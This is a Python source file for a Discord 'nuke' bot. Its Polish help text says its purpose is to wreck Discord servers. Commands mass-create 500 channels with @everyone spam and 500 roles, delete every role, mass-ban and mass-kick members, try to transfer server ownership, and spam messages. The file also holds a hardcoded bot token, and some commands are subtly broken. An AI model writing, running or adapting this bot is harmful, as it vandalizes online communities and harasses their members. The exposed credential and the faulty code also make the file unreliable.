from colorama import Fore, Style
import discord
from discord.ext.commands import *
from discord.ext import commands
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import random
import asyncio
import time
import json
from itertools import cycle
import datetime
import os
import aiohttp
import sys
import traceback
from discord.utils import get

print(Fore.MAGENTA + "╔═══╦═══╦═══╦═══╗ ╔══╗╔═══╦════╗" + Style.RESET_ALL)
print(Fore.MAGENTA + "║╔═╗║╔═╗║╔═╗║╔══╝ ║╔╗║║╔═╗║╔╗╔╗║" + Style.RESET_ALL)
print(Fore.MAGENTA + "║╚═╝║║ ║║╚══╣╚══╗ ║╚╝╚╣║ ║╠╝║║╚╝" + Style.RESET_ALL)
print(Fore.MAGENTA + "║╔╗╔╣║ ║╠══╗║╔══╝ ║╔═╗║║ ║║ ║║  " + Style.RESET_ALL)
print(Fore.MAGENTA + "║║║╚╣╚═╝║╚═╝║╚══╗ ║╚═╝║╚═╝║ ║║  " + Style.RESET_ALL)
print(Fore.MAGENTA + "╚╝╚═╩═══╩═══╩═══╝ ╚═══╩═══╝ ╚╝  " + Style.RESET_ALL)  

bot = commands.Bot(command_prefix=':', intents=discord.Intents.all())

bot.remove_command('help')

def main_menu():
    print(Fore.RED + "1. START BOT")
    print(Fore.RED + "2. BOT HELP")
    print(Fore.RED + "3. WYJDŹ")

@bot.event
async def on_ready():
    print(Fore.MAGENTA + "╔═══╦═══╦═══╦═══╗ ╔══╗╔═══╦════╗" + Style.RESET_ALL)
    print(Fore.MAGENTA + "║╔═╗║╔═╗║╔═╗║╔══╝ ║╔╗║║╔═╗║╔╗╔╗║" + Style.RESET_ALL)
    print(Fore.MAGENTA + "║╚═╝║║ ║║╚══╣╚══╗ ║╚╝╚╣║ ║╠╝║║╚╝" + Style.RESET_ALL)
    print(Fore.MAGENTA + "║╔╗╔╣║ ║╠══╗║╔══╝ ║╔═╗║║ ║║ ║║  " + Style.RESET_ALL)
    print(Fore.MAGENTA + "║║║╚╣╚═╝║╚═╝║╚══╗ ║╚═╝║╚═╝║ ║║  " + Style.RESET_ALL)
    print(Fore.MAGENTA + "╚╝╚═╩═══╩═══╩═══╝ ╚═══╩═══╝ ╚╝  " + Style.RESET_ALL)
    print("Melduje że wunderwaffe jest gotowe!")
    print(f"Status: Gotowy")
    print(f"Zalogowano jako: {bot.user.name}")

@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()

    guild = ctx.message.guild
    channels_to_create = 500 
    for i in range(channels_to_create):
        channel = await guild.create_text_channel('mihalew_rl ATTACK')
        await channel.send('chesz nuke bota? pisz na pv michalew_rl .  @everyone\n')

    await ctx.invoke(roles)


@bot.command()
async def roles(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    roles_to_create = 500 
    for i in range(roles_to_create):
        role = await guild.create_role(name='mihalew_rl ATTACK')
        await ctx.author.add_roles(role)

@bot.event
async def on_ready():

  
  game = discord.Game("bot by mihalew_rl") 
  await bot.change_presence(status=discord.Status.online, activity=game)

  print(f'Bot jest aktywny {bot.user}!')

@bot.command()
async def clear(ctx, option=None):
    if option == "all":

        for voice_channel in ctx.guild.roles:
            await voice_channel.delete()
    else:
        await ctx.roles.delete()

@bot.command()
async def ban(ctx, *, args):
    author = ctx.message.author
    members_to_ban = args.split()
    for member_mention in members_to_ban:
        member = discord.utils.get(ctx.guild.members, mention=member_mention)
        if member:
            if not member.bot and member != author and member != bot.user:
                await member.ban()

    await ctx.send('Wszyscy oznaczeni użytkownicy zostali zbanowani, oprócz autora komendy i bota.')

@bot.command()
async def kick(ctx, *, args):
    author = ctx.message.author
    members_to_kick = args.split()
    for member_mention in members_to_kick:
        member = discord.utils.get(ctx.guild.members, mention=member_mention)
        if member:
            if not member.bot and member != author and member != bot.user:
                await member.kick()

    await ctx.send('Wszyscy oznaczeni użytkownicy zostali wyrzuceni, oprócz autora komendy i bota.')

@bot.command()
async def plum(ctx, new_owner: discord.Member):
    if new_owner.bot:
        await ctx.send('Bot nie może zostać właścicielem serwera.')
    elif ctx.guild.owner == new_owner:
        await ctx.send(f'{new_owner.mention} jest już właścicielem tego serwera.')
    else:
        await ctx.guild.edit(owner=new_owner)
        await ctx.send(f'Nowym właścicielem serwera jest teraz {new_owner.mention}.')



@bot.command()
async def spam(ctx):
    await ctx.send("Podaj wiadomość do spamowania:")
    
    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel

    try:
        message_response = await bot.wait_for('message', check=check, timeout=60)  
        spam_message = message_response.content
    except asyncio.TimeoutError:
        await ctx.send("Czas na podanie wiadomości minął.")
        return


    await ctx.send("Podaj ilość powtórzeń:")

    try:
        repeat_response = await bot.wait_for('message', check=check, timeout=60)  
        repeat_count = int(repeat_response.content)
    except (asyncio.TimeoutError, ValueError):
        await ctx.send("Nie podano prawidłowej ilości powtórzeń lub czas na odpowiedź minął.")
        return

    for _ in range(repeat_count):
        await ctx.send(spam_message)


while True:
    main_menu()
    choice = input(Fore.MAGENTA + "Wybierz opcję: ")

    if choice == "1":
        bot.run("MTE4MjY4OTc3Nzk5MzEzMDAwNA.G2FDo2.snUSwCsVUooDsoVVJGgxcGM-DFEaiMvWmDbszY")
    elif choice == "2":
        print(Fore.MAGENTA + "╔═══╦═══╦═══╦═══╗ ╔══╗╔═══╦════╗" + Style.RESET_ALL)
        print(Fore.MAGENTA + "║╔═╗║╔═╗║╔═╗║╔══╝ ║╔╗║║╔═╗║╔╗╔╗║" + Style.RESET_ALL)
        print(Fore.MAGENTA + "║╚═╝║║ ║║╚══╣╚══╗ ║╚╝╚╣║ ║╠╝║║╚╝" + Style.RESET_ALL)
        print(Fore.MAGENTA + "║╔╗╔╣║ ║╠══╗║╔══╝ ║╔═╗║║ ║║ ║║  " + Style.RESET_ALL)
        print(Fore.MAGENTA + "║║║╚╣╚═╝║╚═╝║╚══╗ ║╚═╝║╚═╝║ ║║  " + Style.RESET_ALL)
        print(Fore.MAGENTA + "╚╝╚═╩═══╩═══╩═══╝ ╚═══╩═══╝ ╚╝  " + Style.RESET_ALL)
        print(Fore.MAGENTA + "Bot służy do rozpierdalania serwerów dc. " + Style.RESET_ALL)
        print(Fore.MAGENTA + "Autorzy to: mihalew_rl i INOOB1936 " + Style.RESET_ALL) 
        pass
    elif choice == "3":
        break
    else:
        print(Fore.RED + "Nieprawidłowy wybór. Wybierz ponownie.")




































        